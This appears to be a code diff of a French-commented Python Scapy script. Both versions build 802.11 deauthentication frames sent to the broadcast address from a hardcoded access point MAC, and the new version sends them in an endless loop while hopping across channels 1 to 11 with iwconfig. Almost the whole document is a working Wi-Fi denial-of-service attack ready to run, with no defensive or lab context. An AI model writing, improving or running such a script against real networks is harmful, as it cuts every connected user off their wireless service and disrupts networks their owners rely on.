@@ -1,22 +1,28 @@
-from scapy.all import *
+import os
 import time
+from scapy.all import *
 
-def deauth_all(ap_mac, interface):
-    # Créer un paquet de déauthentification
-    packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac, subtype=0x00)
-    packet /= Dot11Deauth(reason=7)  # 7 = raison pour déauthentification
+# Définir l'interface à utiliser (e.g. wlan0, wlan1, etc.)
+interface = "wlan1"
 
-    # Envoyer le paquet en boucle avec une pause entre chaque envoi
-    try:
-        while True:
-            sendp(packet, iface=interface, count=1, verbose=False)
-            print(f"Deauthenticating all devices from {ap_mac}")
-            time.sleep(0.1)  # Pause de 100 ms entre chaque envoi
-    except KeyboardInterrupt:
-        print("Déauthentification interrompue.")
+# Définir le canal à utiliser (e.g. 1, 6, 11, etc.)
+channel = 1
 
-# Remplacez par l'adresse MAC du point d'accès et l'interface réseau
-ap_mac = "08:36:C9:98:11:A9"  # MAC du point d'accès
-interface = "wlan1"           # Interface réseau
+# Adresse MAC du point d'accès (AP)
+ap_address = "08:36:C9:98:11:A9"  # Remplacez par l'adresse MAC de votre AP
 
-deauth_all(ap_mac, interface)
+# Créer le paquet de désauthentification
+packet = RadioTap()/Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_address, addr3=ap_address)/Dot11Deauth(reason=7)
+
+while True:
+    # Changer le canal
+    os.system(f"iwconfig {interface} channel {channel}")
+
+    # Envoyer le paquet
+    sendp(packet, iface=interface, verbose=0)
+
+    # Attendre 1 seconde
+    time.sleep(1)
+
+    # Incrémenter le canal
+    channel = (channel % 11) + 1
